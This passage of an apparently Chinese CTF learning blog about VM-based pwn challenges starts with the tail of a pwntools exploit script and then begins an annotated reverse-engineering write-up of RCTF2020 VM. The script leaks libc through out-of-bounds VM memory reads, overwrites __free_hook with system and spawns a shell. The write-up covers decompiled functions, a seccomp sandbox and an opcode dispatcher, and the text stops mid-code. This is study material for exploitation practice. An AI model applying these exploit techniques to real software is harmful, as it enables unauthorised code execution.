    left_shift<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xff&lt;&lt;8=0xff00)</span>
    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[2]=reg[2]+reg[1](reg[2]=0xff00+0xff=0xffff)</span>
    left_shift<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xffff&lt;&lt;8=0xffff00)</span>
    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[2]=reg[2]+reg[1](reg[2]=0xffff00+0xff=0xffffff)</span>
    setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xc8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[1]=0xc8</span>
    <span class="token comment" spellcheck="true"># reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xffffff&lt;&lt;8=0xffffff00)</span>
    left_shift<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token comment" spellcheck="true"># reg[2]=reg[2]+reg[1](reg[2]=0xffffff00+0xc8=0xffffffc8=-56)</span>
    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[3]=memory[reg[2]]=memory[-56]</span>
    setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[1]=1</span>
    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[2]=reg[2]+reg[1]=-56+1=-55</span>
    read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[4]=memory[reg[2]]=memory[-55]</span>
    setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[1]=0x10</span>
    left_shift<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[1]=reg[1]&lt;&lt;8=0x10&lt;&lt;8=0x1000</span>
    setnum<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[0]=0x90</span>
    <span class="token comment" spellcheck="true"># reg[1]=reg[1]+reh[0]=0x1000+0x90=0x1090 &amp;free_hook-8-&amp;stdin=0x1090</span>
    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[3]=reg[3]+reg[1]</span>
    setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[1]=47</span>
    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[2]=reg[2]+2=-55+47=-8</span>
    write<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># memory[reg[2]]=memory[-8]=reg[3]</span>
    setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[1]=1</span>
    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[2]=reg[2]+1=-8+1=-7</span>
    write<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># memory[reg[2]]=memory[-7]=reg[4]</span>
    u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># exit</span>
<span class="token punctuation">]</span>

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'PC: '</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'SP: '</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'SIZE: '</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'CODE: '</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> code<span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true">#sleep(0.2)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'R3: '</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#gdb.attach(io)</span>
last_4bytes <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">8</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'last_4bytes => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>last_4bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'R4: '</span><span class="token punctuation">)</span>
first_4bytes <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'first_4bytes => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>first_4bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

free_hook <span class="token operator">=</span> <span class="token punctuation">(</span>first_4bytes <span class="token operator">&lt;&lt;</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">+</span>last_4bytes
libc_base <span class="token operator">=</span> free_hook<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OVM?\n'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h2 id="0x3-RCTF2020-VM"><a href="#0x3-RCTF2020-VM" class="headerlink" title="0x3.RCTF2020 VM"></a>0x3.RCTF2020 VM</h2><p>这题跟着ruan师傅的wp来复现</p>
<p>检查保护</p>
<p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C11.jpg" alt="11"></p>
<p>IDA分析</p>
<p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C12.jpg" alt="12"></p>
<p>先看到vm_start函数</p>
<pre class=" language-c"><code class="language-c">_QWORD <span class="token operator">*</span><span class="token function">vm_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  _QWORD <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-10h]</span>

  v1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x1000uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//PC</span>
  <span class="token function">set_stack</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v1<span class="token punctuation">,</span> <span class="token number">0x800u</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//stack</span>
  <span class="token keyword">return</span> v1<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>再跟到set_stack函数中看看</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">set_stack</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">&lt;=</span> <span class="token number">0xFF</span> <span class="token operator">||</span> a2 <span class="token operator">></span> <span class="token number">0x1000</span> <span class="token punctuation">)</span>
    <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid size!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x48</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a2 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x48</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x5C</span><span class="token punctuation">)</span> <span class="token operator">=</span> a2 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x58</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>pwndbg里查看一下</p>
<p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C13.jpg" alt="13"></p>
<p>继续往下看，循环读入code，之后会fork一个子进程，if语句中有一个沙箱</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_A3A</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int16 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-20h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-18h]</span>
  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> <span class="token operator">&amp;</span>unk_203020<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">prctl</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">prctl</span><span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>禁用了execve，因此我们只能通过orw来拿到flag</p>
<p>沙箱之下有一个check函数，check函数稍后再看，我们需要先弄清楚code是什么，往下看run函数，run函数接收两个参数，a1是vm结构体的指针，a2是经过了check之后的code的数量。</p>
<p>run函数很长，篇幅原因就挑几个分析一下。</p>
<pre class=" language-c"><code class="language-c">v7 <span class="token operator">=</span> a2<span class="token punctuation">;</span> 
v34 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v30 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
v2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v30<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取PC区第一个code的第一字节，标志类型</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token number">7</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果第一字节为7</span>
<span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果第二字节为1</span>
  <span class="token punctuation">{</span>
    v13 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取第三字节</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> v13 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">^</span><span class="token operator">=</span> <span class="token function">take_value_QWORD</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//以第三字节为索引，将8LL * v13 + a1中的值与code后8字节异或</span>
    v30 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0xB</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//PC指针往后移到第二个code，1+1+1+8=11</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token comment" spellcheck="true">//如果第二字节不为1</span>
  <span class="token punctuation">{</span>
    v12 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//取第3字节</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> v12 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">^</span><span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//以第四字节为索引，取出8LL * (unsigned __int8)take_value(v30 + 3) + a1中的值，与*(_QWORD *)(8LL * v12 + a1)中的值异或</span>
    v30 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//PC指针后移，1+1+1+1=4</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">//xor功能标志位为7，通过第二字节是否为1，可以指定寄存器中的值与code中的数值异或，或者两个寄存器中的值进行异或</span>
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v2 <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果code第一字节为0</span>
<span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果第二字节为1</span>
  <span class="token punctuation">{</span>
    v28 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取code第三字节</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> v28 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">take_value_QWORD</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将*(_QWORD *)(8LL * v28 + a1)中的值与(v30 + 3)中的值相加</span>
    v30 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//PC指针后移，1+1+1+8=11</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token comment" spellcheck="true">//如果第二字节不为1</span>
  <span class="token punctuation">{</span>
    v27 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取第三字节</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> v27 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将两个寄存器中的值相加，放入v27指定的寄存器中</span>
    v30 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//PC指针后移</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">//add功能标志位为0，通过第二字节是否为1，可以指定寄存器中的值与code中的数值相加，或者两个寄存器中的值进行相加</span>
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果第一字节为1</span>
<span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果第二字节为1</span>
  <span class="token punctuation">{</span>
    v26 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取第三字节</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> v26 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">=</span> <span class="token function">take_value_QWORD</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将以第二字节指定的寄存器中的值与code中的后八字节相减</span>
    v30 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//PC指针后移</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token comment" spellcheck="true">//如果第二字节不为1</span>
  <span class="token punctuation">{</span>
    v25 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取第三字节</span>
